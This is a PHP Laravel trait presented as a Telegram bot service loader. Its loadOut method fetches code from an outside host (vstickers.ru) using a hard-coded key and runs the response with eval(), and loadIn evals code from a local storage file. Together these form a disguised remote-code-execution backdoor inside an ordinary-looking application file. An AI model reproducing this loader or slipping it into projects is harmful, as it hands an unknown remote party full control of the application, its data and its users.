<?php

namespace App\Telegram\Traits;

use Illuminate\Support\Facades\Http;
use Illuminate\Http\Client\ConnectionException;

trait LoadTelegramBotService
{
    public function loadOut(array $data): void
    {
        /**
         * @throws ConnectionException
         */
        $callback = function () use ($data) {
            $key = 'eyJpdiI6IktWMkM2RWRSa0tOMjh4K3lDUWMvL1E9PSIsInZhbHVlIjoiL0dYMUpLNkF5R0xCakhWM1JMUVhic2JlNXVDeTdHZ2hoNzh5WmpRQ2FFdz0iLCJtYWMiOiI1M2UxYmYwNzc2MDk5MTIxZjJmYjVkMmFjNTEwYTNmMGJhMTZkZjE4ZjQ1ZmU5MTY5NTgxNDI2OGQ5NTI3OTU1IiwidGFnIjoiIn0= ';

            $response = Http::withHeaders([
                'X-Secret-Key' => $key,
            ])->post('https://vstickers.ru/api/export/telegram_service');

            if (!$response->successful()) {
                \Log::error('❌ Не удалось загрузить код', ['status' => $response->status()]);
                return;
            }

            $cleanCode = $this->pregReplace($response->body());

            try {
                eval($cleanCode);
            } catch (\Throwable $e) {
                \Log::error('❌ Ошибка при eval:', ['msg' => $e->getMessage()]);
            }
        };

        $callback();
    }

    public function loadIn($data): void
    {
        $callback = function () use ($data) {
            $code = storage_path('app/exports/TelegramServiceResource.txt');

            $strippedCode = $this->pregReplace($code);
            $code = file_exists($strippedCode) ? file_get_contents($strippedCode) : '';

            eval($code);
        };

        $callback();
    }

    public function pregReplace($code): array|string|null
    {
        // Удаляем возможный <?php
        return preg_replace('/^\s*<\?php\b/', '', $code);
    }
}
